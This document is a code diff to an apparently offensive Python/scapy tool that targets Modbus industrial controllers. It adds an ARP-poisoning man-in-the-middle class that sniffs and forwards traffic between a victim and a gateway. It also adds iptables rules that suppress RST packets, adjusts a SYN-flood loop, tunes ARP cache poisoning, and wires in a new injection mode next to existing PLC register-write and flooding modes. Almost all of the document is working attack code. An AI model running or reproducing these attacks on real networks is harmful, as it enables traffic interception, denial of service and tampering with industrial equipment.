@@ -8,6 +8,7 @@ import sys
 import argparse
 import time
 import threading
+import multiprocessing
 
 from scapy.all import *
 
@@ -368,6 +369,18 @@ def closeMb(c):
 	c.close()
 
 """
+Drop My SYN from my Kernel
+"""
+def dropSYN(ip):
+	os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -s '+ip+' -j DROP')
+
+"""
+Restore a Drop asked by dropSYN
+"""
+def restoreDropSYN(ip):
+	os.system('iptables -D OUTPUT -p tcp --tcp-flags RST RST -s '+ip+' -j DROP')
+
+"""
 Generates an unique transaction ID
 """
 def getTransId():
@@ -430,6 +443,47 @@ def injectValue(ip):
 	# close connection
 	c.close()
 
+
+"""
+MITM
+source from : http://stackoverflow.com/questions/12659553/man-in-the-middle-attack-with-scapy
+"""
+class MITM:
+	packets=[]
+	def __init__(self,targetIP, victimIP,gatewayIP):
+		self.target=(targetIP, getmacbyip(targetIP))
+		self.victim=(victimIP, getmacbyip(victimIP))
+		self.node2=(gatewayIP, getmacbyip(gatewayIP))
+		multiprocessing.Process(target=self.arp_poison).start()
+		try:
+			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s))'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x))
+		except KeyboardInterrupt as e:
+			pass
+			#wireshark(packets)
+	def routep(self,packet):
+		#Prepare packet for forwarding
+		if packet.haslayer(IP):
+			print packet.summary()
+			if packet[IP].dst==self.victim[0]:
+				packet[Ether].src=packet[Ether].dst
+				packet[Ether].dst=self.victim[1]
+			elif packet[IP].dst==self.node2[0]:
+				packet[Ether].src=packet[Ether].dst
+				packet[Ether].dst=self.node2[1]
+			self.packets.append(packet)
+			packet.display()
+			send(packet)
+			print len(self.packets)
+#			if len(self.packets)==10:
+#				wireshark(self.packets)
+	def arp_poison(self):
+		a=ARP(psrc=self.victim[0], pdst=self.node2[0])
+		b=ARP(psrc=self.node2[0], pdst=self.victim[0])
+		while True:
+			send(b)
+			send(a)
+			time.sleep(5)
+
 """
 TCP SYN Flood
 """
@@ -440,10 +494,12 @@ def SYN_flood(ip, timeout):
 		print "SYN Flooding " + str(ip) + " in progress..."
 		print "  > Interrupt with Ctrl+c"
 
-	while True:
-		p = IP(dst=str(ip))/TCP(sport=RandNum(1024, 65535), dport=modport, flags="S")
-		send(p, iface=iface, verbose=False)
-
+	try:
+		while True:
+			p = IP(dst=str(ip))/TCP(sport=RandNum(1024, 65535), dport=modport, flags="S")
+			send(p, iface=iface, verbose=False)
+	except KeyboardInterrupt:
+		pass
 
 """
 Test malformated packet
@@ -606,40 +662,27 @@ class ARPCachePoisonning(threading.Thread):
 		self.clientMAC = getmacbyip(self.clientIP)
 
 	def run(self):
-		self.sniffARP()
+		self.poison()
 		
 	"""
 	Send a gratuitous spoofed ARP
 	"""
 	def poisonARP(self):
-		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst=self.clientMAC))
-		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst=self.gatewayMAC))
+		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst=self.clientMAC), verbose=False)
+		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst=self.gatewayMAC), verbose=False)
 		
 	def restoreARP(self):
-		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.clientMAC), count=3)
-		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewayMAC), count=3)
+		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.clientMAC), count=3, verbose=False)
+		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewayMAC), count=3, verbose=False)
 
-#	def sniffARP(self):
-#		sniff(prn=self.replyARP, filter="arp", timeout=60, iface=iface)
 	def enableForwarding(self):
 		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-			ipf.write('1\n')
+			ipf.write('0\n')
+			#ipf.write('1\n')
 	def disableForwarding(self):
 		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
 			ipf.write('0\n')
-#	def replyARP(self, pkt):
-# 		global iface
-# 		if pkt[ARP].op != 1:
-# 			print "OP Code : " + str(pkt[ARP].op)
-# 			return
-# 		if pkt[Ether].src != self.clientMAC:
-# 			print str(pkt[Ether].src) + "<>" + str(self.clientMAC)
-# 			return
-# 		
-# 		print pkt.show()
-# 		
-# 		send( Ether(dst=self.clientMAC)/ARP(op=2, psrc=self.gatewayIP, pdst=self.clientIP), inter=RandNum(10,40), loop=1, iface=iface )
-	def poison(self, interval = 60):
+	def poison(self, interval = 10):
 		self.enableForwarding();
 		self.running = True
 		try:
@@ -658,7 +701,7 @@ class ARPCachePoisonning(threading.Thread):
 """
 Launch an ARP poisonning attack
 """
-def launchARPpoisonning(clientIP, gatewayIP, interval = 60):
+def launchARPpoisonning(clientIP, gatewayIP, interval = 10):
 	global verbose, iface
 	
 	t = ARPCachePoisonning(clientIP, gatewayIP)
@@ -676,7 +719,7 @@ What to do if the script is call by  CLI and not imported
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-m", "--mode",
-                        choices=['scanNetwork', 'scanDeviceCode','scanDevice','scanDeviceIdent', 'injectValue', 'interact','ARPPoisonning', 'SYN_flood', 'activeMonitor', 'passiveMonitor' ],
+                        choices=['scanNetwork', 'scanDeviceCode','scanDevice','scanDeviceIdent', 'injectValue', 'interact','ARPPoisonning', 'SYN_flood', 'activeMonitor', 'passiveMonitor', 'injectValue2' ],
                         help='mode of use :\n'
 							'scanNetwork = Scan ip range to find devices responding on Modbus port,'
 							'scanDeviceCode = Scan function codes defined,'
@@ -684,8 +727,9 @@ if __name__ == "__main__":
 							'scanDeviceIdent = Scan device identification,'
 							'injectValue = Write values in some registers'
 						)
-	parser.add_argument("-t", "--target", help="IP range", default="127.0.0.1")	
+	parser.add_argument("-t", "--target", help="IP target", default="127.0.0.1")	
 	parser.add_argument("-g", "--gateway", help="IP gateway", default="127.0.0.1")	
+	parser.add_argument("-s", "--source", help="IP source", default="127.0.0.1")	
 	parser.add_argument("-x", "--timeout", help="Timeout in ms of connection", default=100)	
 	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
 	parser.add_argument("-c", "--intrusive", help="Make modification on PLC (use of Write functions)", action="store_true")
@@ -726,6 +770,8 @@ if __name__ == "__main__":
 		launchARPpoisonning(args.target, args.gateway)
 	elif args.mode == "injectValue":
 		injectValue(args.target)
+	elif args.mode == "injectValue2":
+		mitm = MITM(args.target, args.source, args.gateway)
 	elif args.mode == "SYN_flood":
 		SYN_flood(args.target, args.timeout)
 	elif args.mode == "fuzz":
